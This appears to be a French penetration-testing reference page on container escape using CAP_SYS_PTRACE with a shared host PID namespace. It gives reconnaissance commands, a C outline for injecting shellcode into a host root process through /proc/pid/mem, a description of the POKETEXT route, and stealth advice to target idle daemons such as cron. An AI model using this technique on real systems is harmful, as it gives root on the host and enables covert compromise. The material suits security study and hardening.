---
title: "CAP_SYS_PTRACE : injecter du code dans les processus de l'hôte via un espace de noms PID partagé"
order: 2
description: "CAP_SYS_PTRACE permet à un conteneur de tracer et de manipuler les processus qu'il peut voir. Combinée à un espace de noms PID hôte partagé (--pid=host), elle laisse un attaquant s'attacher à un processus de l'hôte, écrire du shellcode dans sa mémoire via /proc/pid/mem ou PTRACE_POKETEXT, et détourner son exécution pour exécuter du code en tant qu'utilisateur de ce processus, généralement root."
keywords:
  - cap_sys_ptrace
  - ptrace
  - espace de noms pid
  - injection de processus
  - évasion de conteneur
---

# CAP_SYS_PTRACE

`CAP_SYS_PTRACE` permet à un processus de tracer tout autre processus qu'il peut voir, contournant les restrictions ptrace habituelles de même UID et de `Yama`. À elle seule, à l'intérieur d'un conteneur, elle n'atteint que les processus propres au conteneur. L'évasion apparaît lorsque le conteneur partage aussi l'espace de noms PID de l'hôte, ce qu'accordent `docker run --pid=host` et le `hostPID: true` de Kubernetes : désormais chaque processus de l'hôte est visible, et la capacité permet à l'attaquant d'injecter dans l'un d'eux et d'exécuter du code dans le contexte de l'hôte.

Confirmez les deux préconditions :

```bash
capsh --print | grep -o cap_sys_ptrace
grep CapEff /proc/self/status          # bit 19 set
ls /proc | grep -E '^[0-9]+$' | head   # host PIDs visible => shared PID namespace
ps aux | grep -v grep | grep -E 'sshd|cron|systemd'   # pick a long-lived root target
```

## Voie : écrire dans /proc/pid/mem

L'injection moderne la plus simple évite les opcodes `ptrace` bruts. Avec `CAP_SYS_PTRACE`, vous pouvez effectuer `PTRACE_SEIZE` sur une cible, lire ses registres, et écraser les instructions au `rip` courant en écrivant dans `/proc/<pid>/mem`, puis la laisser exécuter votre shellcode.

```c
// outline: hijack a host process to run execve("/bin/sh", ...)
ptrace(PTRACE_SEIZE, target_pid, 0, 0);
ptrace(PTRACE_INTERRUPT, target_pid, 0, 0);
struct user_regs_struct regs; ptrace(PTRACE_GETREGS, target_pid, 0, &regs);
int fd = open("/proc/<pid>/mem", O_RDWR);
pwrite(fd, shellcode, sizeof(shellcode), regs.rip);   // overwrite at instruction pointer
ptrace(PTRACE_SETREGS, target_pid, 0, &regs);
ptrace(PTRACE_DETACH, target_pid, 0, 0);              // target executes shellcode
```

Le shellcode s'exécute avec les privilèges de la cible ; choisir un démon de l'hôte appartenant à root donne le root de l'hôte. Une charge utile de reverse shell ou d'écriture dans `authorized_keys` est typique.

## Voie : POKETEXT classique

Lorsque les écritures dans `/proc/pid/mem` sont bloquées, la voie plus ancienne est `PTRACE_ATTACH`, puis `PTRACE_POKETEXT` mot par mot pour patcher le segment de texte, puis `PTRACE_SETREGS` et `PTRACE_DETACH`. Elle est plus lente mais ne repose que sur la surface d'appel système ptrace que la capacité déverrouille.

## Notes d'exploitation

- Sans espace de noms PID partagé, aucun processus de l'hôte dans `/proc`, et la capacité n'atteint que les processus internes au conteneur. Vérifiez `ls /proc` pour de hauts PID attribués par l'hôte ou `readlink /proc/1/exe` pointant vers l'init de l'hôte.
- Un filtre seccomp qui bloque `ptrace` neutralise cela même lorsque la capacité est présente ; testez `strace /bin/true` ou un appel minimal `ptrace(PTRACE_TRACEME)`.
- Préférez injecter dans un démon root stable et souvent inactif (par exemple `cron`) plutôt que dans un processus occupé, afin d'éviter de perturber visiblement un service pendant que vous obtenez l'exécution.

## Références

- [man 2 ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [HackTricks : CAP_SYS_PTRACE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace)
